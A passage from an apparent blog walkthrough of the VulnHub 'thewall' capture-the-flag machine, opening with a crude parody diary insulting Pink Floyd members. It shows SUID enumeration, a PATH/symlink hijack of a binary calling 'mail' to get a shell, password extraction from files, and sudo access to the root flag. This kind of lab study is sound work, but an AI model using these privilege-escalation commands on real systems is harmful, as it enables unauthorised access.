        BBC phoned up to ask if I would take part in a documentary - Daves doing it they said. Decided to do it after BBC man assured me we would be recorded on seperate days. Next door came round to ask me to stop beating on the wall - gave them a copy of the album so they could understand. They came back two hours later and asked me to sign it - I did and they left looking puzzled. Heard the man muttering "Shit...I thought he was Dave Gilmour...who IS Roger Waters anyway?" under his breath. Had a cup of black coffee and went to bed. Decided to give the beating my fists against the wall a miss tonight.

        Couldn't sleep, decided to make a list of things that keep me awake at night -

            Thinking about the war.
            Thinking about my father/mother/the war.
            Going round Daves house at 3:00AM and singing "and when the band you're in starts playing different tunes" at the top of my voice.
            Being repeatedly beaten over the head with a rubber chicken.
            Thinking about market forces and the soap opera state.
            Going round Daves at 4:00AM, running thru his garden and singing "the lunatic is on the grass" at the top of my voice.
            Thinking some more about the war.
            Wondering just what I'm going to do to Dave if he comes round and starts any of that rubber chicken shit tonight.
            Lying awake writing lists.

        Fell asleep before I could do number 10.

    Thursday

        Got up late, must get more sleep in future. Decided to work on a new album but couldn't think of a good concept. Listened to all my albums (INCLUDING The Final Cut) in a row and decided to kill myself due to the sheer futility of it all. Couldn't go through with it without writing a new album about what it feels like to want to commit suicide. Finished it and felt a lot better. Sent it to Sony by local courier company - which is trangely called Fat Daves. I always get a kick out of calling and saying "Hello, Fat Daves?? Yeh Roger here, I need you to run an errand for me you fat talentless bastard". Went to BBC documentary and it turned out to be a tribute to Dave!! And he was there!! According to them one of his new business ventures is a courier company!! Said lots of uncomplimentary things about him on camera but he just ran around laughing behind me making finger gestures behind my head. Eventually he collapsed in a fat heap on the floor covered in sweat. Made a mental note to send him another 400 cream cakes and some of my Grecian 2000. Looks like he didn't like the wig I sent him either.

    Friday

        Got up late again, head still sore from the rubber chicken. Message from Sony on the ansaphone - apparently all the account execs killed themselves this morning. I detect the hand of... er... best not think about that one, Phoned and asked if they had a chance to listen to the album - receptionist hung up on me. Stormed round the garden for a couple of hours in an angst ridden torment. Pleb next door kept staring at me, told him I'd put my Paul Carrack CD on full blast if he didn't fuck off. He did. Continued storming for a bit till it got dark and I banged my shins on the bar-B-Q. Next time I do it in the dark I'll take the aviators off.

        Message on ansaphone from some anonymous woman telling me to stop being such a miserable nutcase and to pull myself together. Sounded like my mother. Recorded new ansaphone message:

            "Hi, this is Roger 'I'm outta my mind, me' Waters, I can't take your call as I am far too busy writing large scale concept albums with outrageous stage shows that will never be performed due to poor ticket sales. ALRIGHT, LOOK... MY FATHER DIED IN THE WAR YOU KNOW!! AND I WAS PERSECUTED BY MY MOTHER FROM AN EARLY AGE!! I THINK THAT GIVES ME THE RIGHT TO BE A MISUNDERSTOOD CREATIVE GENIUS!! Right, OK, and I'm a miserable bugger. Leave your message after the tone. Oh yeh, I said I would tour if ATD sold 2 million copies and to date it's only sold 1.3 million, so get off my back about that one as well. Thanks."

    Saturday

        Got up early- it's my birthday!! Mum came round with presents - a pint of milk and a fridge. Uncle Bob didn't even send a card!! Dave sent some singing lesson vouchers - bastard!! Made mental note to send him my new book "Writing successful concept albums based around music and good lyrics rather than some crap with a couple of guitar solos in it" if I ever get the bugger published. For some reason all the publishers think it's a bit hypocritical. Had a tantrum as mum forgot the jelly and ice cream. Sat in my room in the dark for a bit and then called Snowy. Told me he couldn't come round to play as he's joined David as rythm guitarist on his solo album!! Phoned Jehovas Witnesses pretending to be in deep spiritual crisis and gave them Daves adress. Went to bed but had to get up 2 hours later as Dave had sent the Moonies round. Got rid of them by talking about the early years with Syd Barret and playing them Interstellar Overdrive.

    Sunday

        Decided to make it up with Dave - dropped by his house and offered to do some lyrics for his solo project, with no mention of the war/soap opera states/alienation etc. Wrote a great song called "The Bravery of being Ronald Reagan behind a big large thing almost like a Wall that shields your feelings at The Anzio Bridgehead whilst on TV". Dave didn't like it so promised to go home and write another one,

        Got home and decided I din't feel like being nice to him anymore. Sent him these lyrics instead:

            My dad went off to a great big battle
            The TV satellites watched from Seattle
            He fought the buggers left and right
            Then the cameras panned to a dreadful sight
            As some German Kraut
            Snuffed his life right out
            Bugger

            And a monkey sat on Daves old bones
            Buggered his ferraris and wrecked his homes
            And Billy chipped in with Radio Waves
            Shot right up the arse of fat old Dave
            For good lyrics he'll forever hunt
            'Cause that Dave Gilmour, well
            He's just a cunt
            Yeah
{% endhighlight %}

<p>After much more digging I've found that there's more users on the system, apart from the ones we know. </p>

{% highlight bash %}
$ ls -la /home
total 28
drwxr-xr-x   7 root           wheel          512 Oct 24  2015 .
drwxr-xr-x  13 root           wheel          512 Oct 24  2015 ..
drwx------   4 DavidGilmour   DavidGilmour   512 Oct 28  2015 DavidGilmour
drwx------   3 NickMason      NickMason      512 Aug  8  2015 NickMason
drwx------   3 RichardWright  RichardWright  512 Nov 27  2015 RichardWright
drwx------   3 RogerWaters    RogerWaters    512 Oct 28  2015 RogerWaters
drwxr-xr-x   4 root           SydBarrett     512 Oct 24  2015 SydBarrett
{% endhighlight %}

<p>And luckily, two of these users have binaries, with <b>SUID</b> bit set.  </p>

{% highlight bash %}
$ find / -perm -u=s -type f -user DavidGilmour 2>/dev/null
/usr/local/bin/shineon
$ find / -perm -g=s -type f -user NickMason 2>/dev/null
/usr/local/bin/brick
{% endhighlight %}

<p>Unfortunately, one of them is not accessable at the moment. </p>

{% highlight bash %}
$ /usr/local/bin/shineon
ksh: /usr/local/bin/shineon: cannot execute - Permission denied
{% endhighlight %}

<p>But the <b>brick</b> binary is executable and it's asking us for the only member featured on every Pink Floyd album. Quick google query answered this question - it's <b>Nick Mason</b>. </p>
{% highlight text %}
Mason was the only Pink Floyd member to be featured on every one of their albums, and the only constant member of the band since its formation in 1965.
{% endhighlight %}
{% highlight bash %}
$ /usr/local/bin/brick




What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!




Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
$ whoami
NickMason
{% endhighlight %}

<p>Correct answer, and we're logged into another account on the machine. Let's take a look at the directories. </p>

{% highlight bash %}
$ cd /home/NickMason
$ ls -la
total 1576
drwx------  3 NickMason  NickMason     512 Aug  8  2015 .
drwxr-xr-x  7 root       wheel         512 Oct 24  2015 ..
-rw-r--r--  1 NickMason  NickMason      87 Oct 24  2015 .Xdefaults
-rw-r--r--  1 NickMason  NickMason     773 Oct 24  2015 .cshrc
-rw-r--r--  1 NickMason  NickMason     103 Oct 24  2015 .cvsrc
-rw-r--r--  1 NickMason  NickMason     398 Oct 24  2015 .login
-rw-r--r--  1 NickMason  NickMason     175 Oct 24  2015 .mailrc
-rw-r--r--  1 NickMason  NickMason     218 Oct 24  2015 .profile
drwx------  2 NickMason  NickMason     512 Oct 28  2015 .ssh
-rw-r--r--  1 NickMason  NickMason    1284 Oct 26  2015 bio.txt
-rw-r--r--  1 NickMason  NickMason       0 Oct 28  2015 mbox
-rw-r--r--  1 NickMason  NickMason  766656 Aug  8  2015 nick_mason_profile_pic.jpg
{% endhighlight %}

<p>Another group of files. Once again, we have to look at them in order to find clues. </p>

<p><b>bio.txt</b></p>
{% highlight text %}
$ cat bio.txt
"Nicholas Berkeley "Nick" Mason (born 27 January 1944) is an English musician and composer, best known as the drummer of Pink Floyd. He is the only constant member of the band since its formation in 1965. Despite solely writing only a few Pink Floyd songs, Mason has co-written some of Pink Floyd's most popular compositions such as "Echoes" and "Time".

Mason is the only Pink Floyd member to be featured on every one of their albums. It is estimated that as of 2010, the group have sold over 250 million records worldwide,[1][2] including 75 million units sold in the United States.

He competes in auto racing events, such as the 24 Hours of Le Mans.

On 26 November 2012, Mason received an Honorary Doctor of Letters from the University of Westminster at the presentation ceremony of the School of Architecture and Built Environment (he had studied architecture at the University's predecessor, Regent Street Polytechnic, 1962-1967)."

I wander if anyone is reading these bio's?  Richard Wright.. if you're reading this, I'm not really going to cut you into little pieces.  I was just having a joke.  Anyhow, I have now added you to thewall.  You're username is obvious. You'll find your password in my profile pic.

Source: Wikipedia (https://en.wikipedia.org/wiki/Nick_Mason)
{% endhighlight %}

<p><b>nick_mason_profile_pic.jpg</b></p>

{% highlight bash %}
$ file nick_mason_profile_pic.jpg                                                                                                                    
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I
{% endhighlight %}

<p>It's a sound file! </p>

<a href="/img/the-wall/nick_mason.ogg"><b>nick_mason.ogg</b></a>

<p>After listening to it for multiple times, I've noticed a pattern - it's morse code. Let's write it down and translate. </p>
{% highlight text %}
.-...-.-......-.-.-...--.-...--.....-.--------.....-...--..-..-.-...-.......-
RICHARDWRIGHT1943FARFISA
{% endhighlight %}

<p>Another credentials to collection, let's login. Unfortunately we can't <b>ssh</b> into the account, we have to change account on the current shell.  </p>

{% highlight bash %}
$ su RichardWright
Password:
ksh: Cannot determine current working directory
$ ls -la
ls: .: Permission denied
$ whoami
RichardWright
{% endhighlight %}

<p>Quick check showed that now we're able to run previously restricted binary! </p>

{% highlight bash %}
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
2
Echoes - Meddle
RogerWaters ttyp0    Aug  3 04:42   (192.168.56.102)


Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
1

    August 2017
Su Mo Tu We Th Fr Sa
       1  2  3  4  5
 6  7  8  9 10 11 12
13 14 15 16 17 18 19
20 21 22 23 24 25 26
27 28 29 30 31      

Time - The Dark Side of the Moon

Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
3
Is There Anybody Out There? - The Wall
ping: unknown host: www.google.com
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
No mail for RichardWright
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
5
Quitting program
{% endhighlight %}

<p>But running <b>strings</b> on this binary showed that <b>mail</b> path is not correctly limited. That way we can create a <b>symlink</b> that will execute our program, instead of mail. </p>

{% highlight bash %}
$ strings /usr/local/bin/shineon
/usr/libexec/ld.so
OpenBSD
OpenBSD
libc.so.80.1
printf
__stack_smash_handler
__srget
getc
puts
system
_thread_atfork
environ
__progname
__cxa_atexit
__sF
__isthreaded
scanf
_Jv_RegisterClasses
__got_start
__got_end
__data_start
_edata
__bss_start
__progname_storage
__fini
__init_tcb
QRP1
[^_]
Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to continue.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c 3 www.google.com
Keep Talking- The Division Bell
mail
{% endhighlight %}

<p>Creating symlinks and overwriting the <b>PATH</b>. </p>

{% highlight bash %}
$ ln -s /bin/sh /tmp/mail
$ export PATH=/tmp:$PATH
{% endhighlight %}

<p>And now it's time to run this program once again. </p>

{% highlight bash %}
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
$ whoami
DavidGilmour
{% endhighlight %}

<p>Another account added to collection! What will he have in home directory? </p>

{% highlight bash %}
$ cd /home/DavidGilmour
$ ls -la
total 408
drwx------  4 DavidGilmour  DavidGilmour     512 Oct 28  2015 .
drwxr-xr-x  7 root          wheel            512 Oct 24  2015 ..
-rw-r--r--  1 DavidGilmour  DavidGilmour      87 Oct 24  2015 .Xdefaults
-rw-r--r--  1 DavidGilmour  DavidGilmour     773 Oct 24  2015 .cshrc
-rw-r--r--  1 DavidGilmour  DavidGilmour     103 Oct 24  2015 .cvsrc
-rw-r--r--  1 DavidGilmour  DavidGilmour     398 Oct 24  2015 .login
-rw-r--r--  1 DavidGilmour  DavidGilmour     175 Oct 24  2015 .mailrc
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 26  2015 .private
-rw-r--r--  1 DavidGilmour  DavidGilmour     218 Oct 24  2015 .profile
drwx------  2 DavidGilmour  DavidGilmour     512 Oct 28  2015 .ssh
-rw-------  1 DavidGilmour  DavidGilmour     384 Aug  8  2015 anotherbrick.txt
-rw-r--r--  1 DavidGilmour  DavidGilmour    1022 Oct 26  2015 bio.txt
-rwxr-----  1 DavidGilmour  DavidGilmour  182073 Oct 28  2015 david_gilmour_profile_pic.jpg
-rw-r--r--  1 DavidGilmour  DavidGilmour     785 Oct 27  2015 mbox
{% endhighlight %}

<p><b>anotherbrick.txt  </b></p>
{% highlight bash %}
$ cat anotherbrick.txt                                                                                                                               
# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs
{% endhighlight %}

<p>New website, that's cool! Let's take a look at it. </p>

{% highlight bash %}
http://192.168.56.103/pinkfloyd1965newblogsite50yearscelebration-temp/index.php
{% endhighlight %}

![New website](/img/the-wall/new-web.png){:class="img-responsive center-block"}

<p>If you take a closer look at the image, you will be able to find pieces of a string. I've managed to play a little with the setting in <b>gimp</b> and changing <b>threshold</b> allowed us to see whole message. </p>


![Image after](/img/the-wall/img-after.png){:class="img-responsive center-block"}

{% highlight bash %}
/welcometothemachine
50696e6b466c6f796435305965617273
{% endhighlight %}

<p>I've tried looking for this direcotory in the website, but there was nothing. After coming back to the David's home directory, I've found his password in the image file. </p>

{% highlight bash %}
$ strings david_gilmour_profile_pic.jpg
8?>>=
dy~g
|Mvk
7OnN}
Nn_}
^=>W
{w|6
Om?OoA
who_are_you_and_who_am_i
{% endhighlight %}

<p>And after logging in, I've used <b>find</b> command to look for a directory. </p>

{% highlight bash %}
$ su DavidGilmour
Password:
$ find / -name 'welcometothemachine' 2>/dev/null
/var/www/htdocs/welcometothemachine
$ cd /var/www/htdocs/welcometothemachine
$ ls -la
total 24
drwxr-xr-x  2 root  welcometothemachine   512 Aug  8  2015 .
drwxr-x---  4 www   welcometothemachine   512 Nov 27  2015 ..
-rws--s---  1 root  welcometothemachine  7513 Nov 27  2015 PinkFloyd
$ PinkFloyd                                                                  
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!
{% endhighlight %}

<p>Permissions granted? What does it mean? After a while, I noticed that the <b>sudo</b> permissions were granted to us. </p>

{% highlight bash %}
$ sudo ls -al /root
Password:
total 48
drwx------   5 root  wheel   512 Nov 27  2015 .
drwxr-xr-x  13 root  wheel   512 Oct 24  2015 ..
-rw-r--r--   1 root  wheel    87 Aug 16  2015 .Xdefaults
-rw-r--r--   1 root  wheel   578 Aug 16  2015 .cshrc
-rw-r--r--   1 root  wheel    94 Aug 16  2015 .cvsrc
-rw-r--r--   1 root  wheel   328 Aug 16  2015 .login
-rw-r--r--   1 root  wheel   468 Aug 16  2015 .profile
drwx------   2 root  wheel   512 Nov 27  2015 .ssh
-rw-r--r--   1 root  wheel  2739 Nov 27  2015 flag.txt
drwxr-xr-x   2 root  wheel   512 Nov 14  2015 scripts
drwxr-xr-x   2 root  wheel   512 Oct 27  2015 tmp
$ sudo cat /root/flag.txt

"The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar"

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ '__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,' , .  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |\ | | ,' |       |       |       | |
  |_|_______|_______|____ ' | _ | | \| |'\ _|_______|_______|_______|_|
  |     |       |       |   \  _' '  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-' |  ,-. \ /_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   ) |       |       |     |
  |_____|_______|_______|_ | _ |-'`-'  |  | ,' _|_______|_______|_____|
  | |       |       |      |        |  '  ;'        |       |       | |
  |_|_______|_______|______"|_____  _,- o'__|_______|_______|_______|_|
  |     |       |       |       _,-'    .       |       |       |     |
  |_____|_______|_______|_ _,--'\      _,-'_____|_______|_______|_____|
  | |       |       |     '     ||_||-' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'  __|_______|_______|_______|_|
  |     |       |       |       |  ||_,-'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'\  |   | __|_______|_______|_____|
  | |       |       |       '  V/    |  |-' |__,    |       |       | |
  |_|_______|_______|_______|_______ _______'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - "the test bunnies"

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-
{% endhighlight %}

<p>And here we have the flag! </p>
